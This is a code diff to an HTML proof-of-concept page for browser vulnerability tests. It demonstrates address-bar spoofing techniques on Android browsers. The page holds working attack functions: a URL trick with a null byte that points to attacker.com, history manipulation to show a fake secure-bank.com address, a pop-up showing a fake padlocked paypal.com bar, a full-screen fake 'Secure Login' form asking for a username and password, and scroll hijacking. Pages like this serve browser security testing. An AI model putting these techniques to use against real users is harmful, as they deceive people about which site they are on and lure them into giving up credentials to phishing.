@@ -3,22 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Address Bar Spoofing PoC</title>
+    <title>Android Browser Vulnerability Tests</title>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; }
         #fake-ui { position: fixed; top: 0; left: 0; width: 100%; height: 40px; background: white; z-index: 9999; padding: 10px; }
     </style>
 </head>
 <body>
-    <h1>Address Bar Spoofing PoCs</h1>
+    <h1>Android Browser Vulnerability PoCs</h1>
     <p>Test different spoofing techniques below:</p>
 
     <button onclick="fullscreenSpoof()">Fullscreen Spoof</button>
     <button onclick="urlEncodingSpoof()">URL Encoding Trick</button>
     <button onclick="replaceHistory()">History Manipulation</button>
     <button onclick="popupSpoof()">Pop-up Spoof</button>
+    <button onclick="overlaySpoof()">Fake Input Overlay</button>
+    <button onclick="scrollHijack()">Scroll Hijacking</button>
 
     <script>
+        // 1️⃣ Fullscreen Spoofing Attack
         function fullscreenSpoof() {
             document.documentElement.requestFullscreen();
             document.body.innerHTML = `
@@ -27,20 +30,47 @@
             `;
         }
 
+        // 2️⃣ URL Encoding Trick
         function urlEncodingSpoof() {
             window.location.href = "https://www.google.com%00@attacker.com";
         }
 
+        // 3️⃣ History Manipulation Attack
         function replaceHistory() {
             window.location.replace("https://secure-bank.com");
             setTimeout(() => {
                 history.replaceState({}, "Fake Title", "https://secure-bank.com");
-            }, 200);
+            }, 500);
         }
 
+        // 4️⃣ Pop-up Spoof Attack (May be blocked on mobile browsers)
         function popupSpoof() {
             let win = window.open("", "", "width=400,height=50");
-            win.document.write("<p>🔒 https://paypal.com</p>");
+            if (win) {
+                win.document.write("<p>🔒 https://paypal.com</p>");
+            } else {
+                alert("Pop-up blocked!");
+            }
+        }
+
+        // 5️⃣ Fake Input Overlay Attack
+        function overlaySpoof() {
+            document.body.innerHTML = `
+                <div style='position: fixed; top: 0; left: 0; width: 100%; height: 100vh; background: white; z-index: 9999; padding: 20px;'>
+                    <h2>🔒 Secure Login</h2>
+                    <p>Enter your credentials to proceed:</p>
+                    <input type='text' placeholder='Username'><br>
+                    <input type='password' placeholder='Password'><br>
+                    <button>Login</button>
+                </div>
+            `;
+        }
+
+        // 6️⃣ Scroll Hijacking Attack
+        function scrollHijack() {
+            document.addEventListener('scroll', function () {
+                window.scrollTo(0, 0); // Prevents scrolling, making the page look real
+            });
         }
     </script>
 </body>
